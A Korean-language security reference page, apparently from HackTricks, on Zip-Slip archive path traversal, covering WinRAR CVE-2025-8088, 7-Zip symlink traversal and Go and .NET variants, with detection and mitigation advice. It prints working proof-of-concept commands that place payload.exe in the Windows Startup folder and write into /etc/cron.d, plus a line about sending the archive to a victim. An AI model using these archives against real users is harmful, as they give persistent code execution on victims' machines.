# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 개요

많은 archive 형식(ZIP, RAR, TAR, 7-ZIP 등)은 각 entry에 자체 **internal path**를 포함할 수 있습니다. extraction utility가 해당 path를 무조건 따를 경우, `..` 또는 **absolute path**(예: `C:\Windows\System32\`)가 포함된 조작된 filename이 사용자가 선택한 directory 외부에 기록됩니다.
이 취약점 유형은 일반적으로 *Zip-Slip* 또는 **archive extraction path traversal**이라고 합니다.<sup>[[6]](#references)</sup>

그 결과 arbitrary file을 덮어쓰는 것부터, Windows *Startup* folder와 같은 **auto-run** 위치에 payload를 배치하여 직접 **remote code execution (RCE)**을 달성하는 것까지 다양한 문제가 발생할 수 있습니다.

## 근본 원인

1. 공격자는 하나 이상의 file header에 다음 항목이 포함된 archive를 생성합니다.
* Relative traversal sequence (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute path (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* 또는 target dir 외부로 resolve되는 조작된 **symlink**(*nix의 ZIP/TAR에서 흔함)
2. Victim은 embedded path를 신뢰하거나 symlink를 따르는 vulnerable tool을 사용하여 archive를 extract합니다. 이때 path를 sanitise하거나 선택한 directory 하위로 extraction을 강제하지 않습니다.
3. File은 공격자가 제어하는 location에 기록되고, 다음에 system 또는 user가 해당 path를 trigger할 때 execute/load됩니다.

### .NET `Path.Combine` + `ZipArchive` traversal

일반적인 .NET anti-pattern은 의도한 destination과 **user-controlled** `ZipArchiveEntry.FullName`을 결합한 뒤 path normalisation 없이 extract하는 것입니다:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName`이 `..\\`로 시작하면 traversal이 발생합니다. **absolute path**인 경우 왼쪽 구성 요소가 완전히 삭제되어, extraction identity로 **arbitrary file write**가 가능합니다.
- scheduled scanner가 감시하는 sibling `app` 디렉터리에 쓰기 위한 PoC archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
해당 ZIP을 모니터링되는 inbox에 넣으면 `C:\samples\app\0xdf.txt`가 생성되어 `C:\samples\queue\` 외부로의 traversal이 가능함을 입증하고, 후속 primitives(예: DLL hijacks)를 활성화합니다.

## 실제 사례 – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows용 WinRAR(`rar` / `unrar` CLI, DLL 및 portable source 포함)는 extraction 중 filename을 검증하지 못했습니다.  
다음과 같은 entry가 포함된 악성 RAR archive:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
결국 선택한 출력 디렉터리 **외부**이자 사용자의 *Startup* 폴더 내부에 위치하게 됩니다. Windows는 로그온 후 해당 위치에 있는 모든 항목을 자동으로 실행하므로, *persistent* RCE를 제공하게 됩니다.<sup>[[5]](#references)</sup>

### PoC Archive 제작 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
사용된 옵션:
* `-ep`  – 파일 경로를 지정된 그대로 저장합니다(앞의 `./`를 **제거하지 않음**).

`evil.rar`를 피해자에게 전달하고 취약한 WinRAR 빌드로 압축을 해제하도록 안내합니다.

### 실제 공격에서 관찰된 Exploitation

ESET은 CVE-2025-8088을 악용하는 RAR archive를 첨부하여 맞춤형 backdoor를 배포하고 ransomware 작업을 지원한 RomCom(Storm-0978/UNC2596)의 spear-phishing campaign을 보고했습니다.<sup>[[5]](#references)</sup>

## 최신 사례(2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: 압축 해제 중 **symbolic link**인 ZIP entry가 역참조되어 공격자가 대상 directory를 벗어나 임의의 path를 덮어쓸 수 있었습니다. 사용자 상호작용은 archive를 *열거나 압축 해제하는 것*뿐입니다.<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09(Windows 및 Linux build). **25.00**(2025년 7월) 및 이후 버전에서 수정되었습니다.
* **Impact path**: `Start Menu/Programs/Startup` 또는 service-run location을 덮어씀 → 다음 logon 또는 service restart 시 code가 실행됩니다.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
patched build에서는 `/etc/cron.d`가 수정되지 않으며, symlink가 `/tmp/target` 내부의 link로 압축 해제됩니다.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()`가 `../` 및 symlink된 ZIP entry를 따라가 `outputDir` 외부에 파일을 씁니다.<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1(현재 project는 deprecated 상태).
* **Fix**: `mholt/archives` ≥ 0.1.0으로 전환하거나 write 전에 canonical-path check를 구현합니다.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – archive entry를 나열하고 `../`, `..\\`, *absolute path*(`/`, `C:`)를 포함하는 name 또는 target이 extraction dir 외부를 가리키는 *symlink* 유형의 entry를 탐지합니다.
* **Canonicalisation** – `realpath(join(dest, name))`이 여전히 `dest`로 시작하는지 확인합니다. 그렇지 않으면 거부합니다.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – *safe* extractor(예: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00)를 사용하여 disposable directory에 압축을 해제하고, 생성된 path가 directory 내부에 유지되는지 확인합니다.
* **Endpoint monitoring** – WinRAR/7-Zip 등으로 archive를 연 직후 `Startup`/`Run`/`cron` location에 새 executable이 작성되면 alert를 발생시킵니다.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ 및 7-Zip 25.00+는 path/symlink sanitisation을 구현합니다. 두 tool 모두 auto-update 기능은 여전히 없습니다.
2. 가능한 경우 “**Do not extract paths**” / “**Ignore paths**”를 사용하여 archive를 압축 해제합니다.
3. Unix에서는 압축 해제 전에 privilege를 낮추고 **chroot/namespace**를 mount합니다. Windows에서는 **AppContainer** 또는 sandbox를 사용합니다.
4. custom code를 작성하는 경우 create/write **전에** `realpath()`/`PathCanonicalize()`로 normalise하고, destination에서 벗어나는 모든 entry를 거부합니다.

## 추가 영향 / 과거 사례

* 2018 – Snyk가 다수의 Java/Go/JS library에 영향을 미치는 대규모 *Zip-Slip* advisory를 발표했습니다.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011에서 `-ao` merge 중 유사한 traversal이 발생했습니다.
* 2025 – HashiCorp `go-slug`(CVE-2025-0377)의 slug TAR extraction traversal(v1.2에서 patch 적용).<sup>[[7]](#references)</sup>
* write 전에 `PathCanonicalize` / `realpath`를 호출하지 않는 모든 custom extraction logic.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
